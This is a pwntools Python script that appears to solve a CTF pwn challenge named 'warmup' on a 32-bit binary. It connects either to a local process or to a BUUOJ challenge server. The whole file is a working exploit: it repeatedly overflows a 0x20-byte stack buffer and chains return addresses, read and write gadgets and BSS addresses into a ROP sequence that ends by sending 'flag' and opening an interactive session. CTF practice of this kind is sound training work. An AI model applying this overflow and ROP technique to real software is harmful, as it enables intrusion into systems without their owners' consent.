import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./warmup')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./warmup')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',26585)
			elf=ELF('./warmup')
			libc=ELF('../../i386libc/libc.so.6')

		def bug():
			gdb.attach(io,'b *0x080481b8')
			#pause()


		data_addr=0x080491bc
		main_addr=0x080480D8
		bss1_addr=0x08049800
		bss2_addr=0x08049900
		add_esp_30=0x080481b8
		read_addr=0x0804811D
		write_addr=0x08048135
		ret_addr=0x080480d0


		pay='a'*0x20+p32(main_addr)+p32(0x11111111)
		pay+=p32(1)+p32(bss2_addr)+p32(0x30)
		io.send(pay)
		sleep(0.1)
		pay='a'*0x20+p32(main_addr)+p32(0x11111111)*3
		pay+=p32(write_addr)
		io.send(pay)
		sleep(0.1)
		pay='a'*0x20+p32(main_addr)+p32(0x11111111)*4
		io.send(pay)
		sleep(0.1)
		pay='a'*0x20+p32(main_addr)+p32(bss2_addr)+p32(0x30)+p32(0x11111111)*2
		io.send(pay)
		sleep(0.1)
		pay='a'*0x20+p32(main_addr)+p32(0x22222222)
		pay+=p32(read_addr)+p32(add_esp_30)+p32(3)
		io.send(pay)
		sleep(0.1)
		pay='a'*0x20+p32(main_addr)+p32(0x22222222)*4
		io.send(pay)
		sleep(0.1)
		pay='a'*0x20+p32(main_addr)+p32(0x22222222)*4
		io.send(pay)
		sleep(0.1)
		pay='a'*0x20+p32(main_addr)+p32(add_esp_30)
		pay+=p32(bss1_addr)+p32(0)+p32(0)
		io.send(pay)
		sleep(0.1)
		pay='a'*0x20+p32(main_addr)+p32(0x33333333)*3
		pay+=p32(0x8048122)
		io.send(pay)
		sleep(0.1)
		pay='a'*0x20+p32(main_addr)+p32(0x33333333)*4
		io.send(pay)
		sleep(0.1)
		pay='a'*0x20+p32(main_addr)+p32(bss1_addr)+p32(0x30)+p32(0x33333333)*2
		io.send(pay)
		sleep(0.1)
		pay='a'*0x20+p32(ret_addr)*2
		pay+=p32(read_addr)+p32(add_esp_30)+p32(0)
		io.send(pay)
		#bug()
		sleep(0.1)
		io.send('flag\x00')





		# success('libc_base:'+hex(libc_base))
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue